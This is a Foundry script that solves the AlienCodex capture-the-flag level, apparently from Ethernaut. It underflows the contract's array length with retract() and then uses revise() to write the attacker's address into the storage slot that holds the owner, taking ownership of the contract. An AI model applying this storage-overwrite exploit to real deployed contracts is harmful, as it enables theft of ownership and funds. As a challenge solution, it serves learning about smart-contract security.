// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {AlienCodex} from "../src/19-AlienCodex.sol";
import {AlienCodexFactory} from "../src/AlienCodexFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract AlienCodexSolution is Script {
    AlienCodex public alienCodexLevel;
    address payable instanceAddress = payable(0x5B91ab77DB4fcCfC8cCb8258aCa6C79bf133bbd7);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        alienCodexLevel = AlienCodex(instanceAddress);

        console.log("Owner before the attack: %s", alienCodexLevel.owner());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        alienCodexLevel.makeContact();
        alienCodexLevel.retract();

        uint256 ownerSlot = ((2 ** 256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        alienCodexLevel.revise(ownerSlot, bytes32(uint256(uint160(publicKey))));

        vm.stopBroadcast();

        console.log("Owner after the attack: %s", alienCodexLevel.owner());

        validate();
    }

    function validate() internal {
        bool isValidated = new AlienCodexFactory().validateInstance(instanceAddress, publicKey);
        console.log("Challenge Completed: %s", isValidated);
    }
}
